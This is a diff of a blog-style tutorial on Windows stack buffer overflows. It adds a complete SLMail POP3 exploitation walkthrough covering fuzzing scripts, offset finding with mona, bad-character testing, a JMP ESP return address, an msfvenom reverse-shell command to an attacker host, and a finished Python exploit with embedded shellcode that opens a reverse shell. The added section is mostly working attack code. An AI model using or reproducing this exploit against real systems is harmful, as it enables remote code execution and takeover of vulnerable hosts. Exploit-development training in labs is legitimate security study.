@@ -18,8 +18,7 @@ Truthfully everything talked about in this article is very out-dated and no long
 This is my planned path at current
 
 - Simple EIP Overflow
-- SEH Overflow
-- Egghunting
+- SEH Overflow / Egghunting
 - DEP/ASLR Bypass/Bruteforce
 - Heap Overflows
 
@@ -35,10 +34,6 @@ I want to begin by talking about memory layout, what the stack is & finally how 
 
 https://windowsexploit.com/blog/2017/1/29/learning-strategies-effective-techniques-to-learn-windows-exploitation
 
-
-
-https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
-
 ### [](#header-3) VM Setup
 
 I won't go into much detail here but basically I have a Windows 7 x64 VM Setup within VMWare Workstation Pro with the below installed/disabled
@@ -49,11 +44,13 @@ I won't go into much detail here but basically I have a Windows 7 x64 VM Setup w
 - Immunity Debugger
   - Mona.py Installed
 - IDA Free
-- ASLR Disabled
-- DEP Disabled
+- **ASLR** Disabled
+  - Use **EMET GUI**
+- **DEP** Disabled
   - `bcdedit /set {current} nx AlwaysOff`
 - Visual Studio (Optional)
-- EMET GUI - Used to Disable ASLR
+
+
 
 
 ### [](#header-3) Basic Assembly Instructions & Examples
@@ -187,7 +184,7 @@ Now here we can see 3 types of **Registers**
 
 
 
-The below example is ripped from manybutfinite but was one of the first examples that made me actually think to myself *I'm finally understanding this shit* - This is a linux example of a **stack frame** being created on a *live stack* 
+The below example is ripped from manybutfinite but was one of the first examples that made me actually think to myself *I'm finally understanding this shit* - This is a linux example of a **stack frame** being created on a *live stack* however the principles remain the same. 
 
 ![img](https://manybutfinite.com/img/stack/mainProlog.png)
 
@@ -215,15 +212,15 @@ So what are registers? A register is nothing more than a high-speed memory area 
 
 
 
-1. **EIP** – Extended Instruction Pointer – Address of the Next Instruction
-2. **ESP** - Extended Stack Pointer
+-  **EIP** – Extended Instruction Pointer – Address of the Next Instruction
+-  **ESP** - Extended Stack Pointer
    - *Always* points to the top of the stack and represents the most recent item **PUSHED**/**POPPED** onto the stack
-3. **EBP** - Extended Base Pointer
+- **EBP** - Extended Base Pointer
    - aka *base pointer* or *frame pointer* - It points to a fixed location within the *stack frame* of the function *currently running* - i/e, EBP represents the bottom of the *active* **stack frame**. So this really means that the **EBP** register will only change when a new function is *called* or *returned* - This is why you commonly see each items in the stack addresses with an offset from the **EBP** register
      - For ex. `MOV EAX,DWORD PRT SS:[EBP+8]`
      - EBP - 4
-4. **EAX** - Accumulator - Used for performing calculations and stores return values from function calls, also assists with basic operations such as add,subtract and compare. 
-
+- **EAX** - Accumulator
+-  Used for performing basic calculations, store returning values from *function calls* also works as a general-purpose register facilitating add/subtract etc.
 - **EBX** – Base Register.
 - **ECX** – “counter” normally used to hold a loop index.
 - **EDX** – Data Register.
@@ -232,44 +229,6 @@ So what are registers? A register is nothing more than a high-speed memory area 
 
 
 ***
-
-
-
-
-## [](#header-2) Fuzzing
-
-Now fuzzing is the one of the most important parts to finding vulnerabilities, theoretically what we are trying to do is spam the application/inputs with lots and lots of data to force a crash, if we can get the application to crash it's likely that we have overrun the buffer as we are trying to access out of bounds memory locations. 
-
-Typically we can do this with a simple python script like below, I will show a proper example at the bottom where I go over 2 examples.
-
-```python
-#!/usr/bin/python
-import socket
-
-#Create an array of buffers, from 1 to 5900, with increments of 200
-
-buffer=["A"]
-counter = 100
-
-while len(buffer) <= 30:
-	buffer.append("A"*counter)
-	counter=counter+200
-
-for string in buffer:
-	print "Fuzzing PASS with %s bytes" %len(string)
-	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	connect=s.connect(('bof.local',110))
-	s.recv(1024)
-	s.send('application command here')
-	s.recv(1024)
-	s.send('PASS ' + string + '\r\n')
-	s.send('QUIT\r\n')
-	s.close()
-```
-
-
-
-****
 
 
 
@@ -658,3 +617,409 @@ except:
 	print "couldn't connect to server"
 ```
 
+
+
+
+
+## [](#header-2) SLMail
+
+
+
+Similar to VulnServer, SLMail is a legacy piece of software that is sometimes used to teach Buffer Overflow as it has numerous vulnerabilties as well as a fairly simple **Stack-Overflow** to exploit
+
+*https://slmail.software.informer.com/5.5/*
+
+
+
+
+### [](#header-3) Fuzzing & Overrunning EIP
+
+
+
+Let's begin by fuzzing with the below script
+
+```python
+#!/usr/bin/python
+import socket
+import sys
+
+buffer=["A"]
+counter=100
+
+while len(buffer) <= 30:
+	buffer.append("A"*counter)
+	counter=counter+200
+
+
+for string in buffer:
+	print "Fuzzing PASS with %s bytes" %len(string)
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect(('bof.local',110))
+	s.recv(1024)
+	s.send('USER test\r\n')
+	s.recv(1024)
+	s.send('PASS ' + string + '\r\n')
+	s.send('QUIT\r\n')
+	s.close()
+```
+
+This will connect to Port `110` aka **POP** and *fuzz* the PASS input with an incrementing string of `A's`
+
+You may notice, this is the same script we use for **VulnServer** - Well it is, I mainly use nearly the same script for every single Stack-Overflow and you should too. Just create a *skeleton* script that really is one-size-fits-all.
+
+
+
+Upon running this script we will notice it slowly increments `Fuzzing PASS with +200 bytes` each time - Before finally crashing at `2900 bytes` - It actually takes a little while due to how bad SLMail is ;) - Now we have crashed at `2900 Bytes` let's check out Immunity.
+
+
+
+As we can see we have overwritten EIP with `41414141` which represents `4 x A` and we also have a lot a lot of `A's` visible on the **stack.**
+
+![img](https://i.imgur.com/eQYWvC9.png)
+
+
+
+Let's now proceed to finding the offset in which we overrun EIP so we can begin developing our exploit.
+
+
+
+
+
+### [](#header-3) Finding the Offset
+
+
+
+In the previous example for **VulnServer** we used a combination of Metasploit & Mona to show off how to carry out this part so I am going to stick purely to **mona** this time round purely down to personally preference. 
+
+
+
+**Mona**
+
+
+
+Let's first begin by creating a pattern with **mona**, now we know from our fuzzing that we only really need a pattern along the lines of 2900/300 bytes so let's generate that with the below command
+
+
+
+````python
+!mona pc 3000
+````
+
+
+
+This gives us a nice long not repeating string like below
+
+```
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7......
+```
+
+
+
+**Fuzzing Pattern**
+
+
+
+We can now use the below script to send our non-repeating string through instead of numerous A's
+
+
+
+```python
+#!/usr/bin/python
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = "patternhere"
+
+try:
+	print "\nSending evil buffer..."
+	s.connect(('bof.local',110))
+	data = s.recv(1024)
+	s.send('USER username' + '\r\n')
+	data = s.recv(1024)
+	s.send('PASS ' + buffer + '\r\n')
+	print "\nDone!."
+except:
+	print "Could not connect to POP"
+
+```
+
+![img](https://i.imgur.com/zmrKF3S.png)
+
+
+
+Now we can see we have overwritten **EIP** with value `39694438`
+
+
+
+Now let's check offset location with **mona** again
+
+```python
+!mona po 39694438
+```
+
+
+
+![img](https://i.imgur.com/GuWhpPz.png)
+
+
+
+Bingo we overwrite our buffer after **2606 bytes** - Let's check for bad chars before bringing this all together. 
+
+
+
+
+
+### [](#header-3) Finding Bad Characters
+
+
+
+
+
+I won't go into the depths of bad characters and why we have to find them as I covered it in the **VulnServer** example but the long story short is we have to find any characters that our target software would render as *bad* so we can be sure to exclude them when generating shellcode or choosing a JMP instruction.
+
+
+
+We can simple fuzz the program with the below script which will send all characters at once and we can analyse the memory dump for any *dead characters*
+
+
+
+I typically use the below script.
+
+
+
+```python
+#!/usr/bin/python
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+buffer = "A"*2606 + "B"*4+ badchars
+
+try:
+	print "\nSending evil buffer..."
+	s.connect(('bof.local',110))
+	data = s.recv(1024)
+	s.send('USER username' + '\r\n')
+	data = s.recv(1024)
+	s.send('PASS ' + buffer + '\r\n')
+	print "\nDone!."
+except:
+	print "Could not connect to POP"
+```
+
+
+
+Notice the line 
+
+```python
+buffer = "A"*2606 + "B"*4+ badchars
+```
+
+We have *filled* the buffer with 2606 A's, then overwritten the EIP value with `42424242` and we will put all the bad chars after. Also! Notice we have left out `\x00` as it will be evaluated as a nullbyte therefore terminating the string which we do not want for obvious reasons.
+
+
+
+Let's send it through and check the memory dump.
+
+
+
+Now checking the memory dump, unlike **VulnServer** which did not have any bad characters we actually have a couple this time round which is good for educational purposes.
+
+As you can see on the fourth line down we follow this sequence
+
+
+
+```hex
+01 02 03 04 05 06 07 08 09 29
+```
+
+Everything is going fine until suddenly it goes from 09 to 29? What?! It should be 10 !! - This is a bad character. 
+
+
+
+Now if we check our `badchars` array in our python script we can see that the 10th character is `x0a` - Now we remove `x0a` from our array and send bad chars through again see if we notice anything else.
+
+
+
+Now checking again we can see that we jump straight from `0C`	 to `0E` missing out `0D` which means that `\x0d` is a bad character.
+
+
+
+![img](https://i.imgur.com/YfkV3KW.png)
+
+
+
+**Bad Char List**
+
+```
+\x0a
+\x00
+\x0d
+```
+
+
+
+Perfect! This is actually the last one so it wasn't too brutal this time round, I have saw exploits with 10+ bad characters, so it could be a lot worse. 
+
+
+
+
+
+### [](#header-3) Finding The Right Module
+
+
+
+Now, just like the previous sections of this example I won't be jumping deep into why we have to find a module here or the in's and outs of a `JMP ESP` instruction as I talked about it above and it should be fairly self-explanatory providing you understand **stack-frames** and basic stack and assembly layout/instructions
+
+
+
+Once again I will use Mona here due to it's simplicity.
+
+
+
+**Mona**
+
+
+
+```python
+!mona modules
+```
+
+
+
+What we're looking for here is a module/dll that was not built with DEP/ASLR. Looking at the screenshot below it would appear that `SLMFC.DLL` would be of use.
+
+
+
+![img](https://i.imgur.com/9EylYmM.png)
+
+
+
+Let's now use Mona to find a `JMP ESP` instruction that we can use for our **return address** which will therefore jump to our **NOPS** and slide straight into our shellcode/payload.
+
+![img](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTy4mJZ1obv8guGsBqk%2F-LTy6h5PM8kC1O7NPz4_%2FScreen%20Shot%202018-12-17%20at%204.41.53%20PM.png?alt=media&token=33f849e0-6d0a-4b36-9148-ce95511fc3b5) 
+
+*Source: https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow*
+
+
+
+**Mona Find JMP ESP**
+
+```python
+!mona find –s “\xff\xe4” –m SLMFC.dll
+```
+
+
+
+![img](https://i.imgur.com/bWADdRO.png)
+
+
+
+
+
+Woah! We have quite a few results here, let's look for a memory location of `JMP ESP` instruction and ensure that it has no bad characters in, Remember our bad chars are `\x0a` `\x00` `\x0d` so we have to ensure that any memory locations we choose (left pane) do not contain any of these chars. 
+
+
+
+There are actually a couple options here but I went with `0x5f4a358f` which translates too `\x8f\x35\x4a\x5f` after removing the leading-zero and reversing due to little-endian. 
+
+
+
+Perfect so `\x8f\x35\x4a\x5f` will now act as our **return address**.
+
+
+
+
+
+### [](#header-3) Generating Shellcode and Adding NOPS
+
+
+
+This is always the fun part! Generating the payload. I normally use msfvenom to use this due to the simplicity so let's jump straight into it.
+
+
+
+```bash
+m0chan@kali:/> msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.12 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d"
+```
+
+
+
+**Assemble The Exploit**
+
+
+
+Now bringing all the pieces together;
+
+- **Buffer Size** - `2606 Bytes`
+- **Return-Address** - `\x8f\x35\x4a\x5f`
+- **NOPS** - `"\x90" * 16`
+- **Shellcode** - MSFVenom Output
+
+
+
+Combining the 4 elements from above we end up with the below exploit.
+
+```python
+#!/usr/bin/python
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+shellcode = (
+"\xbe\xa8\x2f\xd7\xf1\xdb\xc0\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
+"\x52\x31\x75\x12\x83\xc5\x04\x03\xdd\x21\x35\x04\xe1\xd6\x3b"
+"\xe7\x19\x27\x5c\x61\xfc\x16\x5c\x15\x75\x08\x6c\x5d\xdb\xa5"
+"\x07\x33\xcf\x3e\x65\x9c\xe0\xf7\xc0\xfa\xcf\x08\x78\x3e\x4e"
+"\x8b\x83\x13\xb0\xb2\x4b\x66\xb1\xf3\xb6\x8b\xe3\xac\xbd\x3e"
+"\x13\xd8\x88\x82\x98\x92\x1d\x83\x7d\x62\x1f\xa2\xd0\xf8\x46"
+"\x64\xd3\x2d\xf3\x2d\xcb\x32\x3e\xe7\x60\x80\xb4\xf6\xa0\xd8"
+"\x35\x54\x8d\xd4\xc7\xa4\xca\xd3\x37\xd3\x22\x20\xc5\xe4\xf1"
+"\x5a\x11\x60\xe1\xfd\xd2\xd2\xcd\xfc\x37\x84\x86\xf3\xfc\xc2"
+"\xc0\x17\x02\x06\x7b\x23\x8f\xa9\xab\xa5\xcb\x8d\x6f\xed\x88"
+"\xac\x36\x4b\x7e\xd0\x28\x34\xdf\x74\x23\xd9\x34\x05\x6e\xb6"
+"\xf9\x24\x90\x46\x96\x3f\xe3\x74\x39\x94\x6b\x35\xb2\x32\x6c"
+"\x3a\xe9\x83\xe2\xc5\x12\xf4\x2b\x02\x46\xa4\x43\xa3\xe7\x2f"
+"\x93\x4c\x32\xff\xc3\xe2\xed\x40\xb3\x42\x5e\x29\xd9\x4c\x81"
+"\x49\xe2\x86\xaa\xe0\x19\x41\x79\xe4\x2b\x88\xe9\x07\x2b\xab"
+"\x52\x8e\xcd\xc1\xb4\xc7\x46\x7e\x2c\x42\x1c\x1f\xb1\x58\x59"
+"\x1f\x39\x6f\x9e\xee\xca\x1a\x8c\x87\x3a\x51\xee\x0e\x44\x4f"
+"\x86\xcd\xd7\x14\x56\x9b\xcb\x82\x01\xcc\x3a\xdb\xc7\xe0\x65"
+"\x75\xf5\xf8\xf0\xbe\xbd\x26\xc1\x41\x3c\xaa\x7d\x66\x2e\x72"
+"\x7d\x22\x1a\x2a\x28\xfc\xf4\x8c\x82\x4e\xae\x46\x78\x19\x26"
+"\x1e\xb2\x9a\x30\x1f\x9f\x6c\xdc\xae\x76\x29\xe3\x1f\x1f\xbd"
+"\x9c\x7d\xbf\x42\x77\xc6\xdf\xa0\x5d\x33\x48\x7d\x34\xfe\x15"
+"\x7e\xe3\x3d\x20\xfd\x01\xbe\xd7\x1d\x60\xbb\x9c\x99\x99\xb1"
+"\x8d\x4f\x9d\x66\xad\x45")
+
+buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode
+
+try:
+	print "\nSending evil buffer..."
+	s.connect(('bof.local',110))
+	data = s.recv(1024)
+	s.send('USER username' + '\r\n')
+	data = s.recv(1024)
+	s.send('PASS ' + buffer + '\r\n')
+	print "\nDone!."
+except:
+	print "Could not connect to POP"
+
+
+
+```
+
+
+
+Now we run and we should pop a reverse shell.
+
+
+
+![img](https://i.imgur.com/D73KVlu.png)
